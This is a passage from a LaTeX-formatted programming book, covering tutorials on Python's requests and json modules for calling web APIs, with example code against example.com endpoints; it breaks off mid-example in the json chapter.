    \ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{200}\NormalTok{:}
\NormalTok{        data }\OperatorTok{=}\NormalTok{ response.json()}
        \ControlFlowTok{return}\NormalTok{ data[}\StringTok{\textquotesingle{}rates\textquotesingle{}}\NormalTok{]}
    \ControlFlowTok{else}\NormalTok{:}
        \ControlFlowTok{return} \VariableTok{None}

\KeywordTok{def}\NormalTok{ display\_exchange\_rates(rates):}
    \ControlFlowTok{if}\NormalTok{ rates:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Exchange Rates:"}\NormalTok{)}
        \ControlFlowTok{for}\NormalTok{ currency, rate }\KeywordTok{in}\NormalTok{ rates.items():}
            \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{currency}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{rate}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
    \ControlFlowTok{else}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Failed to retrieve exchange rates"}\NormalTok{)}

\CommentTok{\# Fetch and display exchange rates for USD}
\NormalTok{rates }\OperatorTok{=}\NormalTok{ fetch\_exchange\_rates(}\StringTok{\textquotesingle{}USD\textquotesingle{}}\NormalTok{)}
\NormalTok{display\_exchange\_rates(rates)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-24}

Interacting with web APIs is a powerful way to integrate external data
and services into your Python applications. By using the
\texttt{requests} library to make HTTP requests and the \texttt{json}
module to handle JSON data, you can efficiently fetch, send, and process
data from various APIs. Proper error handling and understanding of
authentication methods are crucial for robust API interactions.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive Tutorial on the \texttt{requests}
Python Module for Interacting with
APIs}{Deep Dive Tutorial on the requests Python Module for Interacting with APIs}}\label{deep-dive-tutorial-on-the-requests-python-module-for-interacting-with-apis}

The \texttt{requests} module is a simple and elegant HTTP library for
Python. It is designed to be user-friendly and easy to use for making
HTTP requests to interact with APIs. This deep dive tutorial will cover
the fundamentals and advanced usage of the \texttt{requests} module.

\section{Table of Contents}\label{table-of-contents-8}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-requests]{Introduction to \texttt{requests}}
\item
  \hyperref[installing-requests]{Installing \texttt{requests}}
\item
  \hyperref[making-http-requests]{Making HTTP Requests}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[get-request]{GET Request}
  \item
    \hyperref[post-request]{POST Request}
  \item
    \hyperref[put-request]{PUT Request}
  \item
    \hyperref[delete-request]{DELETE Request}
  \end{itemize}
\item
  \hyperref[handling-responses]{Handling Responses}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[status-codes]{Status Codes}
  \item
    \hyperref[response-content]{Response Content}
  \item
    \hyperref[json-responses]{JSON Responses}
  \end{itemize}
\item
  \hyperref[customizing-requests]{Customizing Requests}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[headers]{Headers}
  \item
    \hyperref[query-parameters]{Query Parameters}
  \item
    \hyperref[request-body]{Request Body}
  \item
    \hyperref[timeouts]{Timeouts}
  \end{itemize}
\item
  \hyperref[session-objects]{Session Objects}
\item
  \hyperref[handling-authentication]{Handling Authentication}
\item
  \hyperref[error-handling]{Error Handling}
\item
  \hyperref[advanced-usage]{Advanced Usage}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[streaming-downloads]{Streaming Downloads}
  \item
    \hyperref[uploading-files]{Uploading Files}
  \item
    \hyperref[custom-transport-adapters]{Custom Transport Adapters}
  \end{itemize}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{\texorpdfstring{Introduction to
\texttt{requests}}{Introduction to requests}}\label{introduction-to-requests}

The \texttt{requests} module allows you to send HTTP requests using
Python. It abstracts the complexities of making requests behind a simple
API, allowing you to send HTTP requests to interact with web resources
like REST APIs.

\section{\texorpdfstring{Installing
\texttt{requests}}{Installing requests}}\label{installing-requests}

To install the \texttt{requests} module, you can use pip:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install requests}
\end{Highlighting}
\end{Shaded}

\section{Making HTTP Requests}\label{making-http-requests}

The \texttt{requests} module supports all the major HTTP methods, such
as GET, POST, PUT, DELETE, etc. Each method corresponds to a function
within the module.

\subsection{GET Request}\label{get-request}

A GET request is used to retrieve data from a server. Here's how to make
a simple GET request:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.status\_code)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{POST Request}\label{post-request}

A POST request is used to send data to a server. Here's an example:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}key1\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}key2\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value2\textquotesingle{}}\NormalTok{\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.post(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, data}\OperatorTok{=}\NormalTok{data)}
\BuiltInTok{print}\NormalTok{(response.status\_code)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{PUT Request}\label{put-request}

A PUT request is used to update data on a server. Here's an example:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}key1\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}new\_value1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}key2\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}new\_value2\textquotesingle{}}\NormalTok{\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.put(}\StringTok{\textquotesingle{}https://api.example.com/data/1\textquotesingle{}}\NormalTok{, data}\OperatorTok{=}\NormalTok{data)}
\BuiltInTok{print}\NormalTok{(response.status\_code)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{DELETE Request}\label{delete-request}

A DELETE request is used to delete data from a server. Here's an
example:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.delete(}\StringTok{\textquotesingle{}https://api.example.com/data/1\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.status\_code)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\section{Handling Responses}\label{handling-responses}

\subsection{Status Codes}\label{status-codes}

HTTP status codes indicate whether a specific HTTP request has been
successfully completed. \texttt{requests} allows you to check the status
code of the response:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.status\_code)}
\ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{200}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Success!"}\NormalTok{)}
\ControlFlowTok{elif}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{404}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Not Found."}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Response Content}\label{response-content}

The content of the response can be accessed in different ways:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.text)  }\CommentTok{\# Raw text content}
\BuiltInTok{print}\NormalTok{(response.content)  }\CommentTok{\# Raw binary content}
\BuiltInTok{print}\NormalTok{(response.json())  }\CommentTok{\# JSON content (if applicable)}
\end{Highlighting}
\end{Shaded}

\subsection{JSON Responses}\label{json-responses}

If the response contains JSON data, you can directly decode it:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{)}
\NormalTok{data }\OperatorTok{=}\NormalTok{ response.json()}
\BuiltInTok{print}\NormalTok{(data)}
\end{Highlighting}
\end{Shaded}

\section{Customizing Requests}\label{customizing-requests}

\subsection{Headers}\label{headers}

You can customize the headers sent with your requests:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{headers }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}User{-}Agent\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}my{-}app/0.0.1\textquotesingle{}}\NormalTok{\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, headers}\OperatorTok{=}\NormalTok{headers)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{Query Parameters}\label{query-parameters}

You can add query parameters to your requests:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{params }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}param1\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}param2\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value2\textquotesingle{}}\NormalTok{\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, params}\OperatorTok{=}\NormalTok{params)}
\BuiltInTok{print}\NormalTok{(response.url)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{Request Body}\label{request-body}

For POST and PUT requests, you can include data in the request body:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}key1\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}key2\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value2\textquotesingle{}}\NormalTok{\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.post(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, data}\OperatorTok{=}\NormalTok{data)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

You can also send JSON data by using the \texttt{json} parameter:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}key1\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}key2\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}value2\textquotesingle{}}\NormalTok{\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.post(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, json}\OperatorTok{=}\NormalTok{data)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{Timeouts}\label{timeouts}

You can specify a timeout for your requests:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, timeout}\OperatorTok{=}\DecValTok{5}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\section{Session Objects}\label{session-objects}

A \texttt{Session} object allows you to persist certain parameters
across requests. It also persists cookies across all requests made from
the session instance.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{session }\OperatorTok{=}\NormalTok{ requests.Session()}
\NormalTok{session.headers.update(\{}\StringTok{\textquotesingle{}User{-}Agent\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}my{-}app/0.0.1\textquotesingle{}}\NormalTok{\})}

\NormalTok{response }\OperatorTok{=}\NormalTok{ session.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\section{Handling Authentication}\label{handling-authentication}

The \texttt{requests} module supports various types of authentication,
such as Basic Auth, Digest Auth, OAuth, etc.

\subsection{Basic Authentication}\label{basic-authentication}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ requests.auth }\ImportTok{import}\NormalTok{ HTTPBasicAuth}

\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, auth}\OperatorTok{=}\NormalTok{HTTPBasicAuth(}\StringTok{\textquotesingle{}user\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}pass\textquotesingle{}}\NormalTok{))}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{Bearer Token
Authentication}\label{bearer-token-authentication}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{headers }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}Authorization\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Bearer YOUR\_ACCESS\_TOKEN\textquotesingle{}}\NormalTok{\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{, headers}\OperatorTok{=}\NormalTok{headers)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\section{Error Handling}\label{error-handling-1}

The \texttt{requests} module provides built-in exception handling for
common HTTP errors.

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    response }\OperatorTok{=}\NormalTok{ requests.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{)}
\NormalTok{    response.raise\_for\_status()}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.HTTPError }\ImportTok{as}\NormalTok{ err:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}HTTP error occurred: }\SpecialCharTok{\{}\NormalTok{err}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.}\PreprocessorTok{ConnectionError} \ImportTok{as}\NormalTok{ err:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Connection error occurred: }\SpecialCharTok{\{}\NormalTok{err}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.Timeout }\ImportTok{as}\NormalTok{ err:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}Timeout error occurred: }\SpecialCharTok{\{}\NormalTok{err}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ requests.exceptions.RequestException }\ImportTok{as}\NormalTok{ err:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f\textquotesingle{}An error occurred: }\SpecialCharTok{\{}\NormalTok{err}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Advanced Usage}\label{advanced-usage}

\subsection{Streaming Downloads}\label{streaming-downloads}

For large files, you can stream the content to avoid loading it all into
memory at once.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://example.com/largefile.zip\textquotesingle{}}
\ControlFlowTok{with}\NormalTok{ requests.get(url, stream}\OperatorTok{=}\VariableTok{True}\NormalTok{) }\ImportTok{as}\NormalTok{ response:}
\NormalTok{    response.raise\_for\_status()}
    \ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}largefile.zip\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}wb\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ f:}
        \ControlFlowTok{for}\NormalTok{ chunk }\KeywordTok{in}\NormalTok{ response.iter\_content(chunk\_size}\OperatorTok{=}\DecValTok{8192}\NormalTok{):}
\NormalTok{            f.write(chunk)}
\end{Highlighting}
\end{Shaded}

\subsection{Uploading Files}\label{uploading-files}

You can upload files using the \texttt{files} parameter.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{files }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}file\textquotesingle{}}\NormalTok{: }\BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}report.csv\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}rb\textquotesingle{}}\NormalTok{)\}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.post(}\StringTok{\textquotesingle{}https://api.example.com/upload\textquotesingle{}}\NormalTok{, files}\OperatorTok{=}\NormalTok{files)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{Custom Transport Adapters}\label{custom-transport-adapters}

You can create custom transport adapters for specific needs.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ requests.adapters }\ImportTok{import}\NormalTok{ HTTPAdapter}
\ImportTok{from}\NormalTok{ requests.packages.urllib3.util.retry }\ImportTok{import}\NormalTok{ Retry}

\KeywordTok{class}\NormalTok{ MyAdapter(HTTPAdapter):}
    \KeywordTok{def}\NormalTok{ init\_poolmanager(}\VariableTok{self}\NormalTok{, }\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs):}
\NormalTok{        kwargs[}\StringTok{\textquotesingle{}retries\textquotesingle{}}\NormalTok{] }\OperatorTok{=}\NormalTok{ Retry(total}\OperatorTok{=}\DecValTok{10}\NormalTok{, backoff\_factor}\OperatorTok{=}\FloatTok{0.1}\NormalTok{)}
        \BuiltInTok{super}\NormalTok{(MyAdapter, }\VariableTok{self}\NormalTok{).init\_poolmanager(}\OperatorTok{*}\NormalTok{args, }\OperatorTok{**}\NormalTok{kwargs)}

\NormalTok{session }\OperatorTok{=}\NormalTok{ requests.Session()}
\NormalTok{session.mount(}\StringTok{\textquotesingle{}https://\textquotesingle{}}\NormalTok{, MyAdapter())}

\NormalTok{response }\OperatorTok{=}\NormalTok{ session.get(}\StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-25}

The \texttt{requests} module is a powerful and flexible library for
making HTTP requests in Python. This tutorial covered the basics of
making requests, handling responses, customizing requests, and using
advanced features like streaming downloads and file uploads. By
mastering the \texttt{requests} module, you can easily interact with web
services and APIs in your Python applications.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive Tutorial on the \texttt{json} Python
Module for Interacting with
APIs}{Deep Dive Tutorial on the json Python Module for Interacting with APIs}}\label{deep-dive-tutorial-on-the-json-python-module-for-interacting-with-apis}

The \texttt{json} module in Python provides powerful tools for parsing,
serializing, and deserializing JSON data. JSON (JavaScript Object
Notation) is a lightweight data interchange format that is easy for
humans to read and write, and easy for machines to parse and generate.
This deep dive tutorial will cover the fundamentals and advanced usage
of the \texttt{json} module in the context of interacting with APIs.

\section{Table of Contents}\label{table-of-contents-9}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-json]{Introduction to JSON}
\item
  \hyperref[installing-json]{Installing \texttt{json}}
\item
  \hyperref[basic-usage]{Basic Usage}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[parsing-json-data]{Parsing JSON Data}
  \item
    \hyperref[serializing-data-to-json]{Serializing Data to JSON}
  \end{itemize}
\item
  \hyperref[interacting-with-apis]{Interacting with APIs}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[sending-json-data]{Sending JSON Data}
  \item
    \hyperref[receiving-json-data]{Receiving JSON Data}
  \end{itemize}
\item
  \hyperref[advanced-usage]{Advanced Usage}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[custom-serialization]{Custom Serialization}
  \item
    \hyperref[custom-deserialization]{Custom Deserialization}
  \item
    \hyperref[working-with-complex-data-structures]{Working with Complex
    Data Structures}
  \end{itemize}
\item
  \hyperref[error-handling]{Error Handling}
\item
  \hyperref[practical-examples]{Practical Examples}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[example-1-github-api]{Example 1: GitHub API}
  \item
    \hyperref[example-2-openweathermap-api]{Example 2: OpenWeatherMap
    API}
  \end{itemize}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to JSON}\label{introduction-to-json}

JSON (JavaScript Object Notation) is a lightweight data interchange
format that is easy to read and write. It is used extensively in APIs to
exchange data between servers and clients. JSON data consists of
key-value pairs, arrays, and nested objects.

\section{\texorpdfstring{Installing
\texttt{json}}{Installing json}}\label{installing-json}

The \texttt{json} module is included in Python's standard library, so
you don't need to install it separately. You can start using it by
simply importing it:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}
\end{Highlighting}
\end{Shaded}

\section{Basic Usage}\label{basic-usage-1}

\subsection{Parsing JSON Data}\label{parsing-json-data}

To parse JSON data (convert JSON string to Python dictionary), use the
\texttt{json.loads()} function:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\NormalTok{json\_data }\OperatorTok{=} \StringTok{\textquotesingle{}\{"name": "John", "age": 30, "city": "New York"\}\textquotesingle{}}
\NormalTok{parsed\_data }\OperatorTok{=}\NormalTok{ json.loads(json\_data)}
\BuiltInTok{print}\NormalTok{(parsed\_data)  }\CommentTok{\# Output: \{\textquotesingle{}name\textquotesingle{}: \textquotesingle{}John\textquotesingle{}, \textquotesingle{}age\textquotesingle{}: 30, \textquotesingle{}city\textquotesingle{}: \textquotesingle{}New York\textquotesingle{}\}}
\end{Highlighting}
\end{Shaded}

You can also parse JSON data from a file using the \texttt{json.load()}
function:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    parsed\_data }\OperatorTok{=}\NormalTok{ json.load(}\BuiltInTok{file}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(parsed\_data)}
\end{Highlighting}
\end{Shaded}

\subsection{Serializing Data to JSON}\label{serializing-data-to-json}

To serialize Python data structures (like dictionaries and lists) to
JSON, use the \texttt{json.dumps()} function:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"John"}\NormalTok{, }\StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{, }\StringTok{"city"}\NormalTok{: }\StringTok{"New York"}\NormalTok{\}}
\NormalTok{json\_data }\OperatorTok{=}\NormalTok{ json.dumps(data)}
\BuiltInTok{print}\NormalTok{(json\_data)  }\CommentTok{\# Output: \{"name": "John", "age": 30, "city": "New York"\}}
\end{Highlighting}
\end{Shaded}

You can also serialize data to a JSON file using the
\texttt{json.dump()} function:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"John"}\NormalTok{, }\StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{, }\StringTok{"city"}\NormalTok{: }\StringTok{"New York"}\NormalTok{\}}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    json.dump(data, }\BuiltInTok{file}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Interacting with APIs}\label{interacting-with-apis}

\subsection{Sending JSON Data}\label{sending-json-data}

When interacting with APIs, you often need to send JSON data in HTTP
requests. This can be done using the \texttt{requests} module along with
the \texttt{json} module:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}
\ImportTok{import}\NormalTok{ json}

\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}
\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"John"}\NormalTok{, }\StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{\}}
\NormalTok{headers }\OperatorTok{=}\NormalTok{ \{}\StringTok{\textquotesingle{}Content{-}Type\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}application/json\textquotesingle{}}\NormalTok{\}}

\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.post(url, data}\OperatorTok{=}\NormalTok{json.dumps(data), headers}\OperatorTok{=}\NormalTok{headers)}
\BuiltInTok{print}\NormalTok{(response.status\_code)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

Alternatively, the \texttt{requests} module provides a convenient
\texttt{json} parameter to automatically handle JSON serialization:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}
\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"John"}\NormalTok{, }\StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{\}}

\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.post(url, json}\OperatorTok{=}\NormalTok{data)}
\BuiltInTok{print}\NormalTok{(response.status\_code)}
\BuiltInTok{print}\NormalTok{(response.text)}
\end{Highlighting}
\end{Shaded}

\subsection{Receiving JSON Data}\label{receiving-json-data}

When receiving JSON data from an API, you can parse the JSON response
using the \texttt{json} method provided by the \texttt{requests} module:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\NormalTok{url }\OperatorTok{=} \StringTok{\textquotesingle{}https://api.example.com/data\textquotesingle{}}
\NormalTok{response }\OperatorTok{=}\NormalTok{ requests.get(url)}
\NormalTok{parsed\_data }\OperatorTok{=}\NormalTok{ response.json()}
\BuiltInTok{print}\NormalTok{(parsed\_data)}
\end{Highlighting}
\end{Shaded}

\section{Advanced Usage}\label{advanced-usage-1}

\subsection{Custom Serialization}\label{custom-serialization}

Sometimes, you need to customize the serialization process, such as
handling non-serializable objects. You can achieve this by defining a
custom serialization function and passing it to the
\texttt{json.dumps()} function using the \texttt{default} parameter:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}
\ImportTok{from}\NormalTok{ datetime }\ImportTok{import}\NormalTok{ datetime}

\KeywordTok{def}\NormalTok{ custom\_serializer(obj):}
    \ControlFlowTok{if} \BuiltInTok{isinstance}\NormalTok{(obj, datetime):}
        \ControlFlowTok{return}\NormalTok{ obj.isoformat()}
    \ControlFlowTok{raise} \PreprocessorTok{TypeError}\NormalTok{(}\StringTok{"Type not serializable"}\NormalTok{)}

\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"John"}\NormalTok{, }\StringTok{"birthdate"}\NormalTok{: datetime(}\DecValTok{1990}\NormalTok{, }\DecValTok{5}\NormalTok{, }\DecValTok{6}\NormalTok{)\}}
\NormalTok{json\_data }\OperatorTok{=}\NormalTok{ json.dumps(data, default}\OperatorTok{=}\NormalTok{custom\_serializer)}
\BuiltInTok{print}\NormalTok{(json\_data)}
\end{Highlighting}
\end{Shaded}

\subsection{Custom Deserialization}\label{custom-deserialization}

Similarly, you can customize the deserialization process by defining a
custom deserialization function and passing it to the
\texttt{json.loads()} function using the \texttt{object\_hook}
parameter:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}
\ImportTok{from}\NormalTok{ datetime }\ImportTok{import}\NormalTok{ datetime}

\KeywordTok{def}\NormalTok{ custom\_deserializer(dct):}
    \ControlFlowTok{if} \StringTok{\textquotesingle{}birthdate\textquotesingle{}} \KeywordTok{in}\NormalTok{ dct:}
\NormalTok{        dct[}\StringTok{\textquotesingle{}birthdate\textquotesingle{}}\NormalTok{] }\OperatorTok{=}\NormalTok{ datetime.fromisoformat(dct[}\StringTok{\textquotesingle{}birthdate\textquotesingle{}}\NormalTok{])}
